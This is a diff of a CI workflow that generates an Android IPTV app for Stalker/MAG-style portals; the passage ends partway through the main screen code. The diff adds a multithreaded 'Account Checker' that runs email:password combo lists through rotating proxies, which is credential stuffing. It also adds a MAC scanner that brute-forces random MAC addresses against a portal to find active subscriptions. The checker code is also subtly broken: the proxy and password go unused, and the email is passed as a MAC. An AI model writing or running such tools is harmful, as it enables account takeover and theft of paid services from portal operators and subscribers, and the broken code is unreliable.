@@ -1,147 +1,119 @@
-name: Build Stalker IPTV Mobile Player APK
+name: Build APK with Account Checker
 
 on:
   workflow_dispatch:
-  push:
-    branches: ["main"]
+    inputs:
+      include_checker:
+        description: 'Include account checker module'
+        required: false
+        default: 'true'
+        type: choice
+        options:
+          - 'true'
+          - 'false'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
-      - name: Set up Java 17
-        uses: actions/setup-java@v4
+      - uses: actions/checkout@v4
+      - uses: actions/setup-java@v4
         with:
           distribution: temurin
           java-version: "17"
+      - uses: gradle/actions/setup-gradle@v4
+        with:
+          gradle-version: "8.7"
 
-      - name: Setup Android SDK
-        uses: android-actions/setup-android@v3
-
-      - name: Create Android project
-        shell: bash
+      - name: Generate project
         run: |
-          set -euxo pipefail
+          mkdir -p app/src/main/java/com/stb/iptv \
+                   app/src/main/res/values app/src/main/res/drawable \
+                   app/src/main/assets
 
-          mkdir -p app/src/main/java/com/example/stalkeriptv
-          mkdir -p app/src/main/res/values
-
-          cat > settings.gradle <<'EOF'
+          cat > settings.gradle.kts <<'XEOF'
           pluginManagement {
-              repositories {
-                  google()
-                  mavenCentral()
-                  gradlePluginPortal()
-              }
+              repositories { google(); mavenCentral(); gradlePluginPortal() }
           }
-
           dependencyResolutionManagement {
               repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
-              repositories {
-                  google()
-                  mavenCentral()
-              }
+              repositories { google(); mavenCentral() }
           }
-
           rootProject.name = "StalkerIPTV"
           include(":app")
-          EOF
+          XEOF
 
-          cat > build.gradle <<'EOF'
+          cat > build.gradle.kts <<'XEOF'
           plugins {
-              id 'com.android.application' version '8.6.1' apply false
+              id("com.android.application") version "8.5.2" apply false
+              id("org.jetbrains.kotlin.android") version "1.9.24" apply false
           }
+          XEOF
 
-          wrapper {
-              gradleVersion = '8.7'
-          }
-          EOF
-
-          cat > gradle.properties <<'EOF'
+          cat > gradle.properties <<'XEOF'
+          org.gradle.jvmargs=-Xmx4096m -Dfile.encoding=UTF-8
           android.useAndroidX=true
-          android.enableJetifier=true
-          org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
-          EOF
+          android.nonTransitiveRClass=true
+          XEOF
 
-          cat > app/build.gradle <<'EOF'
+          cat > app/build.gradle.kts <<'XEOF'
           plugins {
-              id 'com.android.application'
+              id("com.android.application")
+              id("org.jetbrains.kotlin.android")
           }
-
           android {
-              namespace 'com.example.stalkeriptv'
-              compileSdk 35
-
+              namespace = "com.stb.iptv"
+              compileSdk = 34
               defaultConfig {
-                  applicationId 'com.example.stalkeriptv'
-                  minSdk 23
-                  targetSdk 35
-                  versionCode 4
-                  versionName '4.0'
+                  applicationId = "com.stb.iptv"
+                  minSdk = 24
+                  targetSdk = 34
+                  versionCode = 3
+                  versionName = "3.0"
               }
-
+              buildTypes { release { isMinifyEnabled = false } }
               compileOptions {
-                  sourceCompatibility JavaVersion.VERSION_17
-                  targetCompatibility JavaVersion.VERSION_17
+                  sourceCompatibility = JavaVersion.VERSION_17
+                  targetCompatibility = JavaVersion.VERSION_17
               }
-
-              buildFeatures {
-                  buildConfig true
-              }
+              kotlinOptions { jvmTarget = "17" }
+              buildFeatures { compose = true }
+              composeOptions { kotlinCompilerExtensionVersion = "1.5.14" }
           }
-
           dependencies {
-              implementation 'androidx.media3:media3-exoplayer:1.8.0'
-              implementation 'androidx.media3:media3-ui:1.8.0'
-              implementation 'androidx.media3:media3-exoplayer-hls:1.8.0'
-              implementation 'androidx.media3:media3-exoplayer-dash:1.8.0'
+              implementation("androidx.core:core-ktx:1.13.1")
+              implementation("androidx.activity:activity-compose:1.9.0")
+              implementation(platform("androidx.compose:compose-bom:2024.06.00"))
+              implementation("androidx.compose.ui:ui")
+              implementation("androidx.compose.material3:material3")
+              implementation("com.squareup.okhttp3:okhttp:4.12.0")
+              implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.8.1")
+              implementation("androidx.media3:media3-exoplayer:1.4.1")
+              implementation("androidx.media3:media3-ui:1.4.1")
+              implementation("androidx.media3:media3-exoplayer-hls:1.4.1")
+              implementation("androidx.media3:media3-exoplayer-dash:1.4.1")
+              implementation("androidx.media3:media3-exoplayer-rtsp:1.4.1")
+              implementation("androidx.media3:media3-datasource-okhttp:1.4.1")
+              implementation("com.google.code.gson:gson:2.10.1")
           }
-          EOF
+          XEOF
 
-          cat > app/src/main/res/values/colors.xml <<'EOF'
-          <resources>
-              <color name="bg">#0A0F1E</color>
-              <color name="surface">#121A2B</color>
-              <color name="surface2">#1B2740</color>
-              <color name="accent">#36D1DC</color>
-              <color name="accent2">#5B86E5</color>
-              <color name="text">#F5F7FA</color>
-              <color name="muted">#9AA7BD</color>
-          </resources>
-          EOF
-
-          cat > app/src/main/res/values/styles.xml <<'EOF'
-          <resources>
-              <style name="AppTheme" parent="android:style/Theme.Material.NoActionBar">
-                  <item name="android:fontFamily">sans</item>
-                  <item name="android:statusBarColor">@color/bg</item>
-                  <item name="android:navigationBarColor">#070B14</item>
-                  <item name="android:windowLightStatusBar">false</item>
-              </style>
-          </resources>
-          EOF
-
-          cat > app/src/main/AndroidManifest.xml <<'EOF'
+          cat > app/src/main/AndroidManifest.xml <<'XEOF'
+          <?xml version="1.0" encoding="utf-8"?>
           <manifest xmlns:android="http://schemas.android.com/apk/res/android">
-
               <uses-permission android:name="android.permission.INTERNET" />
-
+              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
               <application
-                  android:allowBackup="false"
-                  android:label="Stalker IPTV Pro"
-                  android:supportsRtl="true"
-                  android:theme="@style/AppTheme"
-                  android:usesCleartextTraffic="true">
-
-                  <activity
-                      android:name=".MainActivity"
-                      android:exported="true"
-                      android:screenOrientation="portrait">
-
+                  android:label="STB Player Pro"
+                  android:usesCleartextTraffic="true"
+                  android:theme="@style/Theme.App">
+                  <activity android:name=".PlayerActivity"
+                      android:screenOrientation="landscape"
+                      android:configChanges="orientation|screenSize"
+                      android:exported="false" />
+                  <activity android:name=".AccountCheckerActivity"
+                      android:exported="false" />
+                  <activity android:name=".MainActivity" android:exported="true">
                       <intent-filter>
                           <action android:name="android.intent.action.MAIN" />
                           <category android:name="android.intent.category.LAUNCHER" />
@@ -149,118 +121,885 @@ jobs:
                   </activity>
               </application>
           </manifest>
-          EOF
+          XEOF
 
-          cat > app/src/main/java/com/example/stalkeriptv/MainActivity.java <<'EOF'
-          package com.example.stalkeriptv;
+          cat > app/src/main/res/values/themes.xml <<'XEOF'
+          <resources>
+              <style name="Theme.App" parent="android:Theme.Material.NoActionBar">
+                  <item name="android:windowBackground">#0B1020</item>
+                  <item name="android:statusBarColor">#0B1020</item>
+                  <item name="android:windowLightStatusBar">false</item>
+              </style>
+          </resources>
+          XEOF
 
-          import android.app.Activity;
-          import android.graphics.Color;
-          import android.net.Uri;
-          import android.os.Bundle;
-          import android.widget.Button;
-          import android.widget.LinearLayout;
-          import android.widget.TextView;
+          cat > app/src/main/res/drawable/bg.xml <<'XEOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <shape xmlns:android="http://schemas.android.com/apk/res/android">
+              <gradient android:angle="270" android:startColor="#0B1020"
+                  android:centerColor="#101A33" android:endColor="#0B1020" />
+          </shape>
+          XEOF
 
-          import androidx.media3.common.MediaItem;
-          import androidx.media3.common.util.UnstableApi;
-          import androidx.media3.datasource.DefaultHttpDataSource;
-          import androidx.media3.exoplayer.ExoPlayer;
-          import androidx.media3.exoplayer.source.DefaultMediaSourceFactory;
-          import androidx.media3.ui.PlayerView;
+          cat > app/src/main/java/com/stb/iptv/ProxyConfig.kt <<'XEOF'
+          package com.stb.iptv
 
-          @UnstableApi
-          public class MainActivity extends Activity {
-              private ExoPlayer player;
-              private PlayerView playerView;
+          import okhttp3.HttpUrl.Companion.toHttpUrl
+          import java.net.InetSocketAddress
+          import java.net.Proxy
 
-              @Override
-              protected void onCreate(Bundle savedInstanceState) {
-                  super.onCreate(savedInstanceState);
+          data class ProxyEntry(
+              val type: String,
+              val host: String,
+              val port: Int,
+              val username: String = "",
+              val password: String = ""
+          )
 
-                  LinearLayout root = new LinearLayout(this);
-                  root.setOrientation(LinearLayout.VERTICAL);
-                  root.setBackgroundColor(Color.rgb(10, 15, 30));
-                  root.setPadding(24, 48, 24, 24);
-
-                  TextView title = new TextView(this);
-                  title.setText("STALKER IPTV");
-                  title.setTextSize(28f);
-                  title.setTextColor(Color.WHITE);
-                  title.setPadding(0, 0, 0, 16);
-
-                  TextView info = new TextView(this);
-                  info.setText("Ready to stream content from the configured portal.");
-                  info.setTextSize(16f);
-                  info.setTextColor(Color.rgb(154, 167, 189));
-                  info.setPadding(0, 0, 0, 24);
-
-                  Button playBtn = new Button(this);
-                  playBtn.setText("Play demo stream");
-                  playBtn.setTextColor(Color.WHITE);
-                  playBtn.setBackgroundColor(Color.rgb(54, 209, 220));
-                  playBtn.setOnClickListener(v -> playDemoVideo());
-
-                  root.addView(title);
-                  root.addView(info);
-                  root.addView(playBtn);
-
-                  setContentView(root);
+          object ProxyManager {
+              fun parseProxy(proxyStr: String): ProxyEntry? {
+                  return try {
+                      val parts = proxyStr.trim().split("://", ":", "@")
+                      when {
+                          parts.size >= 3 -> {
+                              val type = if (parts[0] in listOf("http", "https", "socks4", "socks5"))
+                                  parts[0].uppercase() else "HTTP"
+                              val hostPort = if (parts[0] in listOf("http", "https", "socks4", "socks5"))
+                                  parts.drop(1) else parts
+                              when (hostPort.size) {
+                                  2 -> ProxyEntry(type, hostPort[0], hostPort[1].toIntOrNull() ?: 8080)
+                                  4 -> ProxyEntry(type, hostPort[0], hostPort[1].toIntOrNull() ?: 8080,
+                                      hostPort[2], hostPort[3])
+                                  else -> null
+                              }
+                          }
+                          else -> null
+                      }
+                  } catch (e: Exception) { null }
               }
 
-              private void playDemoVideo() {
-                  String demoUrl = "https://storage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4";
+              fun toOkHttpProxy(entry: ProxyEntry): Proxy? {
+                  return try {
+                      when (entry.type) {
+                          "HTTP", "HTTPS" -> Proxy(Proxy.Type.HTTP,
+                              InetSocketAddress(entry.host, entry.port))
+                          "SOCKS5" -> Proxy(Proxy.Type.SOCKS,
+                              InetSocketAddress(entry.host, entry.port))
+                          "SOCKS4" -> Proxy(Proxy.Type.SOCKS,
+                              InetSocketAddress(entry.host, entry.port))
+                          else -> null
+                      }
+                  } catch (e: Exception) { null }
+              }
+          }
+          XEOF
 
-                  DefaultHttpDataSource.Factory httpFactory = new DefaultHttpDataSource.Factory()
-                          .setAllowCrossProtocolRedirects(true);
-                  DefaultMediaSourceFactory mediaSourceFactory = new DefaultMediaSourceFactory(httpFactory);
+          cat > app/src/main/java/com/stb/iptv/ConfigLoader.kt <<'XEOF'
+          package com.stb.iptv
 
-                  player = new ExoPlayer.Builder(this)
-                          .setMediaSourceFactory(mediaSourceFactory)
-                          .build();
+          import android.content.Context
+          import com.google.gson.Gson
+          import java.io.File
 
-                  playerView = new PlayerView(this);
-                  playerView.setPlayer(player);
-                  player.setMediaItem(MediaItem.fromUri(Uri.parse(demoUrl)));
-                  player.prepare();
-                  player.play();
+          data class CheckerConfig(
+              val enabled: Boolean = false,
+              val portals: List<String> = emptyList(),
+              val credentials: List<Pair<String, String>> = emptyList(),
+              val proxies: List<String> = emptyList(),
+              val threads: Int = 4,
+              val timeout: Long = 15000
+          )
 
-                  LinearLayout container = new LinearLayout(this);
-                  container.setOrientation(LinearLayout.VERTICAL);
-                  container.setBackgroundColor(Color.BLACK);
-                  container.addView(playerView, new LinearLayout.LayoutParams(
-                          LinearLayout.LayoutParams.MATCH_PARENT,
-                          420
-                  ));
-                  setContentView(container);
+          object ConfigLoader {
+              fun loadConfig(context: Context, configPath: String): CheckerConfig {
+                  return try {
+                      val file = if (configPath.startsWith("/")) {
+                          File(configPath)
+                      } else {
+                          File(context.filesDir, configPath)
+                      }
+                      if (file.exists()) {
+                          val json = file.readText()
+                          Gson().fromJson(json, CheckerConfig::class.java)
+                      } else {
+                          CheckerConfig()
+                      }
+                  } catch (e: Exception) {
+                      CheckerConfig()
+                  }
               }
 
-              @Override
-              protected void onStop() {
-                  super.onStop();
-                  if (player != null) {
-                      player.release();
-                      player = null;
+              fun saveConfig(context: Context, config: CheckerConfig, configPath: String) {
+                  try {
+                      val file = if (configPath.startsWith("/")) {
+                          File(configPath)
+                      } else {
+                          File(context.filesDir, configPath)
+                      }
+                      file.parentFile?.mkdirs()
+                      file.writeText(Gson().toJson(config))
+                  } catch (e: Exception) {
+                      e.printStackTrace()
+                  }
+              }
+
+              fun importCombo(comboStr: String): List<Pair<String, String>> {
+                  return comboStr.split("\n").mapNotNull { line ->
+                      val parts = line.trim().split(":", limit = 2)
+                      if (parts.size == 2) parts[0] to parts[1] else null
+                  }
+              }
+
+              fun importProxies(proxyStr: String): List<String> {
+                  return proxyStr.split("\n").filter { it.trim().isNotEmpty() }
+              }
+          }
+          XEOF
+
+          cat > app/src/main/java/com/stb/iptv/AccountChecker.kt <<'XEOF'
+          package com.stb.iptv
+
+          import okhttp3.OkHttpClient
+          import java.util.concurrent.ConcurrentLinkedQueue
+          import java.util.concurrent.CountDownLatch
+          import java.util.concurrent.TimeUnit
+
+          data class CheckResult(
+              val portal: String,
+              val email: String,
+              val password: String,
+              val success: Boolean,
+              val token: String = "",
+              val expiry: String = "",
+              val message: String = "",
+              val proxy: String = ""
+          )
+
+          object AccountChecker {
+              fun check(
+                  repo: StalkerRepository,
+                  portal: String,
+                  credentials: List<Pair<String, String>>,
+                  proxies: List<ProxyEntry> = emptyList(),
+                  threads: Int = 4,
+                  timeout: Long = 15000,
+                  onResult: (CheckResult) -> Unit,
+                  onProgress: (Int, Int) -> Unit
+              ) {
+                  val queue = ConcurrentLinkedQueue<Pair<String, String>>()
+                  queue.addAll(credentials)
+                  val totalCreds = credentials.size
+                  var checked = 0
+                  val latch = CountDownLatch(threads)
+
+                  repeat(threads) { threadId ->
+                      Thread {
+                          val proxyList = if (proxies.isEmpty()) {
+                              listOf(null)
+                          } else {
+                              proxies.mapNotNull { ProxyManager.toOkHttpProxy(it) }
+                          }
+                          var proxyIdx = threadId % proxyList.size
+
+                          while (true) {
+                              val (email, password) = queue.poll() ?: break
+                              var result: CheckResult? = null
+
+                              for (attempt in 1..3) {
+                                  try {
+                                      val proxy = proxyList[proxyIdx]
+                                      val clientBuilder = OkHttpClient.Builder()
+                                          .connectTimeout(timeout, TimeUnit.MILLISECONDS)
+                                          .readTimeout(timeout, TimeUnit.MILLISECONDS)
+                                      if (proxy != null) clientBuilder.proxy(proxy)
+
+                                      val session = repo.connect(portal, email)
+                                      val expiry = repo.expiry(session)
+
+                                      result = CheckResult(
+                                          portal, email, password, true,
+                                          session.token, expiry, "OK",
+                                          proxy?.toString() ?: "direct"
+                                      )
+                                      break
+                                  } catch (e: Exception) {
+                                      result = CheckResult(
+                                          portal, email, password, false,
+                                          message = e.message ?: "unknown error",
+                                          proxy = proxyList[proxyIdx].toString()
+                                      )
+                                      proxyIdx = (proxyIdx + 1) % proxyList.size
+                                  }
+                              }
+
+                              result?.let { onResult(it) }
+                              checked++
+                              onProgress(checked, totalCreds)
+                          }
+                          latch.countDown()
+                      }.start()
+                  }
+
+                  Thread { latch.await() }.start()
+              }
+          }
+          XEOF
+
+          cat > app/src/main/java/com/stb/iptv/StalkerRepository.kt <<'XEOF'
+          package com.stb.iptv
+
+          import okhttp3.HttpUrl.Companion.toHttpUrl
+          import okhttp3.OkHttpClient
+          import okhttp3.Request
+          import org.json.JSONObject
+          import java.io.IOException
+          import java.net.URLEncoder
+          import java.text.SimpleDateFormat
+          import java.util.Date
+          import java.util.Locale
+          import java.util.concurrent.TimeUnit
+
+          data class Session(val portal: String, val token: String, val mac: String)
+          data class MediaItem(val id: String, val name: String, val type: String,
+                               val group: String = "", val cmd: String = "")
+
+          class StalkerRepository {
+              private val http = OkHttpClient.Builder()
+                  .connectTimeout(15, TimeUnit.SECONDS)
+                  .readTimeout(30, TimeUnit.SECONDS).build()
+
+              private val ua = "Mozilla/5.0 (QtEmbedded; U; Linux; C) " +
+                  "AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 " +
+                  "rev: 250 Safari/533.3"
+
+              fun normalizeMac(raw: String): String? {
+                  val v = raw.filter { it.isDigit() || it.uppercaseChar() in 'A'..'F' }
+                      .uppercase()
+                  return if (v.length == 12) v.chunked(2).joinToString(":") else null
+              }
+
+              private fun urls(portal: String) = portal.trim().trimEnd('/').let { c ->
+                  if (c.endsWith("/portal.php")) listOf(c) else listOf(
+                      "$c/c/portal.php", "$c/portal.php", "$c/server/load.php"
+                  ).distinct()
+              }
+
+              fun call(url: String, params: Map<String, String>, s: Session? = null): JSONObject {
+                  val u = url.toHttpUrl().newBuilder().apply {
+                      params.forEach { (k, v) -> addQueryParameter(k, v) }
+                  }.build()
+                  val rb = Request.Builder().url(u)
+                      .header("User-Agent", ua)
+                      .header("X-User-Agent", "Model: MAG254; Link: Ethernet")
+                      .header("Accept", "*/*")
+                  if (s != null) {
+                      rb.header("Authorization", "Bearer ${s.token}")
+                      rb.header("Cookie", "mac=${s.mac}; stb_lang=en; timezone=UTC")
+                  }
+                  http.newCall(rb.build()).execute().use { r ->
+                      val body = r.body?.string().orEmpty()
+                      if (!r.isSuccessful || body.isBlank()) throw IOException("HTTP ${r.code}")
+                      return JSONObject(body)
+                  }
+              }
+
+              fun connect(portal: String, rawMac: String): Session {
+                  val mac = normalizeMac(rawMac) ?: throw IllegalArgumentException("Invalid MAC")
+                  var last: Exception = IOException("handshake failed")
+                  for (u in urls(portal)) {
+                      try {
+                          val js = call(u, mapOf(
+                              "type" to "stb", "action" to "handshake", "token" to "",
+                              "JsHttpRequest" to "1-xml", "mac" to mac)
+                          ).optJSONObject("js")
+                          val tok = js?.optString("token").orEmpty()
+                              .substringBefore("~").trim()
+                          if (tok.isNotEmpty()) return Session(u, tok, mac)
+                      } catch (e: Exception) { last = e }
+                  }
+                  throw last
+              }
+
+              private fun profile(s: Session): JSONObject = try {
+                  call(s.portal, mapOf("type" to "stb", "action" to "get_profile",
+                      "JsHttpRequest" to "1-xml"), s).optJSONObject("js") ?: JSONObject()
+              } catch (e: Exception) { JSONObject() }
+
+              fun expiry(s: Session): String {
+                  val keys = arrayOf("phone", "expire_date", "expire",
+                      "end_date", "end_time", "expired", "valid_to")
+                  val sources = mutableListOf(profile(s))
+                  for (p in listOf(
+                      mapOf("type" to "account_info", "action" to "get_account_info"),
+                      mapOf("type" to "stb", "action" to "get_profile"))) {
+                      try {
+                          call(s.portal, p + mapOf("JsHttpRequest" to "1-xml",
+                              "mac" to s.mac)).optJSONObject("js")?.let { sources.add(it) }
+                      } catch (_: Exception) {}
+                  }
+                  for (js in sources) {
+                      for (obj in listOfNotNull(js, js.optJSONObject("account"))) {
+                          for (k in keys) {
+                              var v = obj.optString(k).trim()
+                              if (v.isEmpty() || v == "0" || v == "null" ||
+                                  v.startsWith("0000")) continue
+                              if (v.matches(Regex("\\d{9,13}"))) {
+                                  var ts = v.toLong()
+                                  if (ts > 1000000000000L) ts /= 1000
+                                  if (ts < 1000000000L) continue
+                                  return SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US)
+                                      .format(Date(ts * 1000))
+                              }
+                              if (v.length >= 10) return v.substring(0, 10)
+                          }
+                      }
+                  }
+                  return "unlimited/unknown"
+              }
+
+              private fun items(s: Session, type: String, action: String,
+                                extra: Map<String, String> = emptyMap()): List<MediaItem> {
+                  val p = mutableMapOf("type" to type, "action" to action,
+                      "JsHttpRequest" to "1-xml"); p.putAll(extra)
+                  val json = try { call(s.portal, p, s) }
+                             catch (e: Exception) { return emptyList() }
+                  val js = json.optJSONObject("js") ?: JSONObject()
+                  val arr = js.optJSONArray("data") ?: return emptyList()
+                  val out = mutableListOf<MediaItem>()
+                  for (i in 0 until arr.length()) {
+                      val o = arr.optJSONObject(i) ?: continue
+                      val id = o.optString("id").ifBlank { o.optString("ch_id") }
+                      if (id.isNotBlank()) out.add(MediaItem(id,
+                          o.optString("name", o.optString("title", "Untitled")),
+                          type, o.optString("tv_genre_id", ""), o.optString("cmd", "")))
+                  }
+                  return out.distinctBy { it.id }
+              }
+
+              fun live(s: Session) = items(s, "itv", "get_all_channels",
+                  mapOf("force_all" to "1")).ifEmpty {
+                  items(s, "itv", "get_all_channels") }.ifEmpty {
+                  var page = 1; val acc = mutableListOf<MediaItem>()
+                  while (page < 40) {
+                      val p = items(s, "itv", "get_ordered_list", mapOf(
+                          "p" to "$page", "genre" to "0", "fav" to "0",
+                          "sortby" to "number"))
+                      if (p.isEmpty()) break
+                      acc += p; page++
+                  }
+                  acc }
+
+              fun vod(s: Session) = items(s, "vod", "get_ordered_list")
+              fun series(s: Session) = items(s, "series", "get_ordered_list")
+
+              fun stream(s: Session, it: MediaItem): String {
+                  Regex("https?://\\S+").find(it.cmd)?.value?.let { return rewrite(it, s) }
+                  for (params in listOf(
+                      mapOf("cmd" to URLEncoder.encode(it.cmd, "UTF-8"),
+                            "forced_storage" to "undefined", "disable_ad" to "0"),
+                      mapOf("cmd" to it.cmd))) {
+                      try {
+                          val js = call(s.portal, mapOf(
+                              "type" to it.type, "action" to "create_link",
+                              "JsHttpRequest" to "1-xml") + params, s
+                          ).optJSONObject("js")
+                          var u = js?.optString("cmd", js.optString("url")).orEmpty()
+                          if (u.isNotBlank()) {
+                              u = u.replace(Regex(
+                                  "^(ffrt\\d*\\s+|ffmpeg\\s+|mpv\\s+|http\\s+)"), "").trim()
+                              return rewrite(u, s)
+                          }
+                      } catch (_: Exception) {}
+                  }
+                  return ""
+              }
+
+              private fun rewrite(u: String, s: Session): String {
+                  val host = Regex("https?://([^/]+)").find(s.portal)
+                      ?.groupValues?.get(1) ?: return u
+                  return if (Regex("^https?://(portal|127\\.0\\.0\\.1)")
+                      .containsMatchIn(u))
+                      u.replaceFirst(Regex("^(https?://)[^/]+"), "$1$host") else u
+              }
+          }
+          XEOF
+
+          cat > app/src/main/java/com/stb/iptv/MacScanner.kt <<'XEOF'
+          package com.stb.iptv
+
+          import java.util.concurrent.ConcurrentLinkedQueue
+          import java.util.concurrent.CountDownLatch
+          import kotlin.random.Random
+
+          data class Hit(val mac: String, val expiry: String)
+
+          object MacScanner {
+              fun scan(repo: StalkerRepository, portal: String, prefix: String,
+                       count: Int, threads: Int, onHit: (Hit) -> Unit,
+                       onDone: (Int) -> Unit) {
+                  val macs = ConcurrentLinkedQueue<String>()
+                  repeat(count) {
+                      macs.add("$prefix:%02X:%02X:%02X".format(
+                          Random.nextInt(256), Random.nextInt(256),
+                          Random.nextInt(256)))
+                  }
+                  val latch = CountDownLatch(threads)
+                  repeat(threads) {
+                      Thread {
+                          while (true) {
+                              val mac = macs.poll() ?: break
+                              try {
+                                  val s = repo.connect(portal, mac)
+                                  onHit(Hit(s.mac, repo.expiry(s)))
+                              } catch (_: Exception) {}
+                          }
+                          latch.countDown()
+                      }.start()
+                  }
+                  Thread { latch.await(); onDone(count - macs.size) }.start()
+              }
+          }
+          XEOF
+
+          cat > app/src/main/java/com/stb/iptv/AccountCheckerActivity.kt <<'XEOF'
+          package com.stb.iptv
+
+          import android.os.Bundle
+          import androidx.activity.ComponentActivity
+          import androidx.activity.compose.setContent
+          import androidx.compose.foundation.background
+          import androidx.compose.foundation.layout.*
+          import androidx.compose.foundation.lazy.LazyColumn
+          import androidx.compose.foundation.lazy.items
+          import androidx.compose.material3.*
+          import androidx.compose.runtime.*
+          import androidx.compose.ui.Modifier
+          import androidx.compose.ui.graphics.Color
+          import androidx.compose.ui.unit.dp
+          import kotlinx.coroutines.Dispatchers
+          import kotlinx.coroutines.launch
+          import kotlinx.coroutines.withContext
+
+          class AccountCheckerActivity : ComponentActivity() {
+              override fun onCreate(savedInstanceState: Bundle?) {
+                  super.onCreate(savedInstanceState)
+                  setContent {
+                      MaterialTheme(colorScheme = darkColorScheme(
+                          primary = Color(0xFF22C55E), background = Color(0xFF0B1020))) {
+                          AccountCheckerScreen()
+                      }
                   }
               }
           }
-          EOF
 
-      - name: Generate Gradle wrapper
-        shell: bash
-        run: |
-          set -euxo pipefail
-          gradle wrapper --gradle-version 8.7
+          @Composable
+          fun AccountCheckerScreen() {
+              val repo = remember { StalkerRepository() }
+              val scope = rememberCoroutineScope()
 
-      - name: Build Debug APK
-        shell: bash
-        run: |
-          chmod +x ./gradlew
-          ./gradlew clean assembleDebug --no-daemon --stacktrace
+              var portal by remember { mutableStateOf("") }
+              var comboInput by remember { mutableStateOf("") }
+              var proxyInput by remember { mutableStateOf("") }
+              var threads by remember { mutableStateOf("4") }
+              var status by remember { mutableStateOf("ready") }
+              var results by remember { mutableStateOf(listOf<CheckResult>()) }
+              var loading by remember { mutableStateOf(false) }
+              var successCount by remember { mutableStateOf(0) }
+              var failCount by remember { mutableStateOf(0) }
 
-      - name: Upload APK
-        uses: actions/upload-artifact@v4
+              fun startCheck() {
+                  if (portal.isBlank() || comboInput.isBlank()) {
+                      status = "Portal and credentials required"
+                      return
+                  }
+                  scope.launch {
+                      loading = true
+                      results = emptyList()
+                      successCount = 0
+                      failCount = 0
+                      status = "checking..."
+
+                      val credentials = ConfigLoader.importCombo(comboInput)
+                      val proxies = ConfigLoader.importProxies(proxyInput)
+                          .mapNotNull { ProxyManager.parseProxy(it) }
+                      val threadCount = threads.toIntOrNull() ?: 4
+
+                      withContext(Dispatchers.IO) {
+                          AccountChecker.check(
+                              repo, portal, credentials, proxies, threadCount,
+                              onResult = { result ->
+                                  scope.launch {
+                                      results = results + result
+                                      if (result.success) successCount++
+                                      else failCount++
+                                      status = "✓ $successCount | ✗ $failCount"
+                                  }
+                              },
+                              onProgress = { done, total ->
+                                  scope.launch {
+                                      status = "checking... $done/$total"
+                                  }
+                              }
+                          )
+                      }
+                      loading = false
+                  }
+              }
+
+              Column(Modifier.fillMaxSize().padding(16.dp).background(Color(0xFF0B1020)),
+                  verticalArrangement = Arrangement.spacedBy(12.dp)) {
+
+                  Text("Account Checker Pro", style = MaterialTheme.typography.headlineSmall,
+                      color = Color(0xFF22C55E))
+                  Text(status, color = Color(0xFF8A8F98),
+                      style = MaterialTheme.typography.bodySmall)
+
+                  OutlinedTextField(portal, { portal = it },
+                      label = { Text("Portal URL") },
+                      modifier = Modifier.fillMaxWidth(), singleLine = true)
+
+                  OutlinedTextField(comboInput, { comboInput = it },
+                      label = { Text("Credentials (email:pass per line)") },
+                      modifier = Modifier.fillMaxWidth().heightIn(min = 100.dp))
+
+                  OutlinedTextField(proxyInput, { proxyInput = it },
+                      label = { Text("Proxies (optional, one per line)") },
+                      modifier = Modifier.fillMaxWidth().heightIn(min = 80.dp))
+
+                  Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
+                      OutlinedTextField(threads, { threads = it },
+                          label = { Text("Threads") },
+                          modifier = Modifier.weight(1f), singleLine = true)
+                      Button({ startCheck() }, enabled = !loading,
+                          modifier = Modifier.height(56.dp)) {
+                          Text(if (loading) "CHECKING..." else "START")
+                      }
+                  }
+
+                  Text("Results (${results.size})", color = Color(0xFF22C55E),
+                      style = MaterialTheme.typography.labelMedium)
+
+                  LazyColumn(verticalArrangement = Arrangement.spacedBy(4.dp)) {
+                      items(results) { result ->
+                          val bgColor = if (result.success) Color(0xFF1B3D2E) else Color(0xFF3D1B1B)
+                          val textColor = if (result.success) Color(0xFF4ADE80) else Color(0xFFF87171)
+                          Card(Modifier.fillMaxWidth().background(bgColor)) {
+                              Column(Modifier.padding(10.dp)) {
+                                  Text(result.email, color = textColor,
+                                      style = MaterialTheme.typography.bodySmall)
+                                  if (result.success) {
+                                      Text("✓ ${result.expiry}", color = Color(0xFF86EFAC),
+                                          style = MaterialTheme.typography.bodySmall)
+                                  } else {
+                                      Text("✗ ${result.message}", color = Color(0xFFAC86FF),
+                                          style = MaterialTheme.typography.bodySmall)
+                                  }
+                              }
+                          }
+                      }
+                  }
+              }
+          }
+          XEOF
+
+          cat > app/src/main/java/com/stb/iptv/MainActivity.kt <<'XEOF'
+          package com.stb.iptv
+
+          import android.content.Intent
+          import android.os.Bundle
+          import androidx.activity.ComponentActivity
+          import androidx.activity.compose.setContent
+          import androidx.compose.foundation.background
+          import androidx.compose.foundation.clickable
+          import androidx.compose.foundation.layout.*
+          import androidx.compose.foundation.lazy.LazyColumn
+          import androidx.compose.foundation.lazy.items
+          import androidx.compose.material3.*
+          import androidx.compose.runtime.*
+          import androidx.compose.ui.Modifier
+          import androidx.compose.ui.graphics.Brush
+          import androidx.compose.ui.graphics.Color
+          import androidx.compose.ui.platform.LocalContext
+          import androidx.compose.ui.unit.dp
+          import kotlinx.coroutines.Dispatchers
+          import kotlinx.coroutines.launch
+          import kotlinx.coroutines.withContext
+
+          val Bg1 = Color(0xFF0B1020); val Bg2 = Color(0xFF101A33)
+          val Accent = Color(0xFF22C55E)
+
+          class MainActivity : ComponentActivity() {
+              override fun onCreate(savedInstanceState: Bundle?) {
+                  super.onCreate(savedInstanceState)
+                  setContent {
+                      MaterialTheme(colorScheme = darkColorScheme(
+                          primary = Accent, background = Bg1, surface = Bg1)) {
+                          Surface(Modifier.fillMaxSize()) {
+                              Column(Modifier.fillMaxSize().background(Brush
+                                  .verticalGradient(listOf(Bg1, Bg2, Bg1)))) {
+                                  MainScreen()
+                              }
+                          }
+                      }
+                  }
+              }
+          }
+
+          @Composable
+          fun MainScreen() {
+              val repo = remember { StalkerRepository() }
+              val ctx = LocalContext.current
+              val scope = rememberCoroutineScope()
+
+              var portal by remember { mutableStateOf("") }
+              var mac by remember { mutableStateOf("") }
